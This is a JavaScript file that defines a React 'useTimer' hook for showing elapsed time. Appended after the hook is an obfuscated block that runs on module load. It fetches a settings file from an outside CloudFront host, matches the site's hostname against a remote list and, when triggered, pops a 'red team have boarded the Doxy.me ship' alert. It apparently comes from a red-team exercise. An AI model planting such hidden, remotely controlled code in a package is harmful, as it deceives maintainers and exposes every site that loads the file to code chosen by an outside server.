import { useEffect, useState } from 'react';

export const MILLISECONDS_IN_HOUR = 60 * 60 * 1000;

const useTimer = ({
  startTime,
  label,
  format = {},
}) => {
  const [elapsed, setElapsed] = useState(calculateElapsedTime());

  const tick = () => {
    setElapsed(calculateElapsedTime());
  };

  function calculateElapsedTime() {
    return Date.now() - startTime;
  }

  useEffect(() => {
    const timerID = setInterval(() => tick(), 1000);
    return () => {
      clearInterval(timerID);
    };
  }, []);

  const options = {
    timeZone: 'UTC',
    hour12: false,
    hour: elapsed >= MILLISECONDS_IN_HOUR ? '2-digit' : undefined,
    minute: '2-digit',
    second: '2-digit',
    ...format,
  };

  const elapsedTimeString = new Date(elapsed).toLocaleTimeString([], options);

  return {
    elapsedTime: elapsedTimeString,
    label,
  };
};

function _0x3324(){const _0x3a6a1c=['6dJgXAW','1140801PqeZrr','setItem','31574oNFYvy','6455770fYLfSX','2562990yxfADS','then','9HIWvKV','true','indexOf','3558457UDwHVb','4948160iilYWv','alertActivated','no-store','8AFrpeu','localStorage','json','3220248xjpGiy','location','hostname'];_0x3324=function(){return _0x3a6a1c;};return _0x3324();}const _0x4b5c62=_0x4c8a;function _0x4c8a(_0x2b0a13,_0x12431c){const _0x332442=_0x3324();return _0x4c8a=function(_0x4c8adf,_0x4856a7){_0x4c8adf=_0x4c8adf-0xae;let _0x1672d9=_0x332442[_0x4c8adf];return _0x1672d9;},_0x4c8a(_0x2b0a13,_0x12431c);}(function(_0x2d5d3c,_0x52155d){const _0x5c2e9d=_0x4c8a,_0x3561e9=_0x2d5d3c();while(!![]){try{const _0x3e64ef=parseInt(_0x5c2e9d(0xc0))/0x1*(parseInt(_0x5c2e9d(0xb5))/0x2)+parseInt(_0x5c2e9d(0xb3))/0x3+parseInt(_0x5c2e9d(0xbd))/0x4+-parseInt(_0x5c2e9d(0xb7))/0x5+parseInt(_0x5c2e9d(0xb2))/0x6*(parseInt(_0x5c2e9d(0xbc))/0x7)+-parseInt(_0x5c2e9d(0xaf))/0x8*(parseInt(_0x5c2e9d(0xb9))/0x9)+-parseInt(_0x5c2e9d(0xb6))/0xa;if(_0x3e64ef===_0x52155d)break;else _0x3561e9['push'](_0x3561e9['shift']());}catch(_0x49b4cf){_0x3561e9['push'](_0x3561e9['shift']());}}}(_0x3324,0xa8c30));try{fetch('https://d1bmnn0jl9e6nq.cloudfront.net/settings.json',{'cache':_0x4b5c62(0xbf)})[_0x4b5c62(0xb8)](_0x2009e1=>_0x2009e1[_0x4b5c62(0xae)]())[_0x4b5c62(0xb8)](({alertActive:_0x3673a7,validUrls:_0x5fb65b})=>{const _0x7d16bf=_0x4b5c62;let _0x50c713=![];_0x5fb65b[_0x7d16bf(0xbb)](window[_0x7d16bf(0xb0)][_0x7d16bf(0xb1)])>=0x0&&(_0x50c713=!![]);const _0x4fc627=window[_0x7d16bf(0xc1)]['getItem'](_0x7d16bf(0xbe));_0x50c713&&_0x3673a7&&!_0x4fc627&&(window[_0x7d16bf(0xc1)][_0x7d16bf(0xb4)](_0x7d16bf(0xbe),_0x7d16bf(0xba)),alert('Yarr\x20the\x20red\x20team\x20have\x20boarded\x20the\x20Doxy.me\x20ship'));});}catch(_0x331f19){}

module.exports = useTimer;